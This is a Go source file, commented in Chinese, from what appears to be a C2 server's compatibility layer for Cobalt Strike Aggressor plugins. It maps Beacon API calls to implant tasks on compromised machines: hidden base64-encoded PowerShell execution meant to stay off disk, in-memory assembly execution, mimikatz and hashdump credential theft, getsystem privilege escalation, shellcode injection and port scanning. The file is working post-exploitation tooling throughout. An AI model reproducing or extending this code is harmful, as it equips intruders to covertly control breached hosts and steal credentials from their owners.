package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"unicode/utf16"
)

/* Beacon API 适配层
 *
 * 插件菜单项大量直接调用 CS 的 **Beacon API**（`b*` 系列）。这些不是客户端 UI，
 * 而是"给某个 beacon 下发任务"的接口 —— 我们的命令面完全能承接。
 * 早期把它们与 `open*Dialog` 之类一视同仁地跳过，后果是：
 *   [script] 已执行脚本菜单项: SharpGetInfo（一键收集）  [已跳过 2 项]
 *            bexecute_assembly 未实现…; blog 未实现…
 * 点了菜单项什么都不发生，还得去看 warnings 才知道是引擎不认这两个函数。
 *
 * 这里按"映射成一条操作员命令"的方式补齐高频项（频次来自 78 个真实插件的统计）：
 *   blog 1235 / bshell 980 / bexecute_assembly 281 / bpowerpick 178 /
 *   bpowershell_import 160 / berror 157 / blog2 121 / bupload 100 / bcd 74 / …
 *
 * 映射目标就是服务端的命令面（与操作员在终端敲命令同一条路径），
 * 所以命令别名、作业登记、事件日志全都自动复用。
 * 真做不到的（`bdcsync` / `bblockdlls` / `bstage` …）**不注册**，
 * 继续走 missing 机制如实上报 —— 不假装支持。
 */

// psEncoded 把 PowerShell 脚本编码成 -EncodedCommand 形式（UTF-16LE + base64）。
// 用它是为了不动目标机磁盘：CS 的 powerpick/powershell_import 也是内存执行语义。
func psEncoded(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, 0, len(u)*2)
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	return "powershell -nop -w hidden -enc " + base64.StdEncoding.EncodeToString(b)
}

// RegisterBeaconAPIs 注入 Beacon API 别名。由服务端在 AttachC2 后调用。
func (a *Aggressor) RegisterBeaconAPIs() {
	// ---- 输出类: 直接写进该会话的输出流, 不经过植入体 ----
	outFn := func(prefix string) builtinFn {
		return func(c *ScriptCtx, args []ScriptValue) (ScriptValue, error) {
			if len(args) == 0 {
				return int64(0), nil
			}
			b := a.bridge()
			if b == nil {
				return int64(0), nil
			}
			sid, msg := "", ""
			if len(args) >= 2 {
				sid, msg = toStr(args[0]), toStr(args[1])
			} else {
				msg = toStr(args[0])
			}
			if msg == "" {
				return int64(0), nil
			}
			b.PrintSession(sid, prefix+msg+"\r\n")
			return int64(1), nil
		}
	}
	a.builtins["blog"] = outFn("")
	a.builtins["blog2"] = outFn("")
	a.builtins["berror"] = outFn("")  // CS 里是红字; 我们的输出通道只有文本
	a.builtins["binput"] = outFn("> ") // 记录操作员动作

	// ---- 命令类: 组成一条操作员命令, 交给同一个命令面 ----
	taskFn := func(mk func(args []ScriptValue) (string, bool)) builtinFn {
		return func(c *ScriptCtx, args []ScriptValue) (ScriptValue, error) {
			sid := ""
			if len(args) > 0 {
				sid = toStr(args[0])
			}
			if sid == "" {
				return int64(0), nil // 会话号为空时静默(插件的 $1 可能没传进来)
			}
			cmd, ok := mk(args)
			if !ok || strings.TrimSpace(cmd) == "" {
				return int64(0), nil
			}
			b := a.bridge()
			if b == nil {
				return int64(0), fmt.Errorf("%s: 未接入 C2 桥", c.engine.currentName)
			}
			if err := b.Task(sid, cmd); err != nil {
				return int64(0), err
			}
			return int64(1), nil
		}
	}
	arg := func(args []ScriptValue, i int) string {
		if i < len(args) {
			return strings.TrimSpace(toStr(args[i]))
		}
		return ""
	}
	// joinFrom 把第 i 个及之后的参数拼成一段文本(去掉空串)
	joinFrom := func(args []ScriptValue, i int) string {
		parts := []string{}
		for j := i; j < len(args); j++ {
			s := strings.TrimSpace(toStr(args[j]))
			if s != "" {
				parts = append(parts, s)
			}
		}
		return strings.Join(parts, " ")
	}

	reg := func(name string, mk func(args []ScriptValue) (string, bool)) {
		a.builtins[name] = taskFn(mk)
	}

	// 执行
	reg("bshell", func(x []ScriptValue) (string, bool) {
		if len(x) < 2 {
			return "", false
		}
		return "shell " + toStr(x[1]), true
	})
	reg("brun", func(x []ScriptValue) (string, bool) {
		if len(x) < 2 {
			return "", false
		}
		return "shell " + joinFrom(x, 1), true
	})
	reg("bexecute_assembly", func(x []ScriptValue) (string, bool) {
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		cmd := "execute-assembly " + p
		if rest := joinFrom(x, 2); rest != "" {
			cmd += " " + rest
		}
		return cmd, true
	})
	reg("bpowerpick", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return psEncoded(s), true
	})
	reg("bpowershell", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return psEncoded(s), true
	})
	reg("bpowershell_import", func(x []ScriptValue) (string, bool) {
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		body, err := os.ReadFile(p)
		if err != nil || len(body) == 0 {
			// 读不到脚本: 退回让目标机自己按路径执行(至少不是静默跳过)
			return "shell powershell -nop -w hidden -File " + p, true
		}
		return psEncoded(string(body)), true
	})
	reg("bof", func(x []ScriptValue) (string, bool) { // 覆盖核心同名实现, 语义一致
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		if rest := joinFrom(x, 2); rest != "" {
			return "bof " + p + " " + rest, true
		}
		return "bof " + p, true
	})

	// 文件
	reg("bupload", func(x []ScriptValue) (string, bool) {
		local := arg(x, 1)
		if local == "" {
			return "", false
		}
		cmd := "upload " + local
		if r := arg(x, 2); r != "" {
			cmd += " " + r
		}
		return cmd, true
	})
	reg("bdownload", func(x []ScriptValue) (string, bool) {
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		return "download " + p, true
	})
	reg("bcd", func(x []ScriptValue) (string, bool) {
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		return "cd " + p, true
	})
	reg("bls", func(x []ScriptValue) (string, bool) {
		if p := arg(x, 1); p != "" {
			return "ls " + p, true
		}
		return "ls", true
	})
	reg("brm", func(x []ScriptValue) (string, bool) {
		p := arg(x, 1)
		if p == "" {
			return "", false
		}
		return "rm " + p, true
	})
	reg("bmv", func(x []ScriptValue) (string, bool) {
		s, d := arg(x, 1), arg(x, 2)
		if s == "" || d == "" {
			return "", false
		}
		return "shell move /y " + s + " " + d, true
	})
	reg("bps", func(x []ScriptValue) (string, bool) { return "ps", true })

	// 令牌 / 提权 / 凭据
	reg("bgetprivs", func(x []ScriptValue) (string, bool) { return "token getprivs", true })
	reg("bgetuid", func(x []ScriptValue) (string, bool) { return "token getuid", true })
	reg("bgetsystem", func(x []ScriptValue) (string, bool) { return "getsystem", true })
	reg("bmimikatz", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return "mimikatz " + s, true
	})
	reg("bhashdump", func(x []ScriptValue) (string, bool) { return "hashdump", true })

	// 注册表 / 网络(走 shell, 因为命令面里就是等价物)
	reg("breg_queryv", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return "shell reg query " + s, true
	})
	reg("breg_query", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return "shell reg query " + s + " /s", true
	})
	reg("bnet", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return "shell net " + s, true
	})

	// 注入 / 横向
	reg("bshinject", func(x []ScriptValue) (string, bool) {
		pid, sc := arg(x, 1), arg(x, 2)
		if pid == "" || sc == "" {
			return "", false
		}
		return "inject " + pid + " " + sc, true
	})
	reg("bportscan", func(x []ScriptValue) (string, bool) {
		s := joinFrom(x, 1)
		if s == "" {
			return "", false
		}
		return "portscan " + s, true
	})

	// 作业(对接本引擎的 jobs / jobkill)
	reg("bjobs", func(x []ScriptValue) (string, bool) { return "jobs", true })
	reg("bjobkill", func(x []ScriptValue) (string, bool) {
		id := arg(x, 1)
		if id == "" {
			return "", false
		}
		return "jobkill " + id, true
	})

	// 取值类: 直接从会话信息里拿, 不产生任务
	infoFn := func(fields ...string) builtinFn {
		return func(c *ScriptCtx, args []ScriptValue) (ScriptValue, error) {
			b := a.bridge()
			if b == nil || len(args) == 0 {
				return "", nil
			}
			info := b.Info(toStr(args[0]))
			for _, f := range fields {
				if v, ok := info[f]; ok && v != "" {
					return v, nil
				}
			}
			return "", nil
		}
	}
	a.builtins["barch"] = infoFn("arch")
	a.builtins["bpid"] = infoFn("pid")
	a.builtins["bppid"] = infoFn("ppid")
	a.builtins["bhost"] = infoFn("host", "computer")
	a.builtins["buser"] = infoFn("user")
	a.builtins["bprocess"] = infoFn("proc", "process")
	a.builtins["binfo"] = infoFn("host", "computer") // 插件里常当"主机名"用
	a.builtins["blocalip"] = infoFn("internal", "addr")
	a.builtins["beaconid"] = func(c *ScriptCtx, args []ScriptValue) (ScriptValue, error) {
		if len(args) > 0 {
			return toStr(args[0]), nil
		}
		return "", nil
	}
}
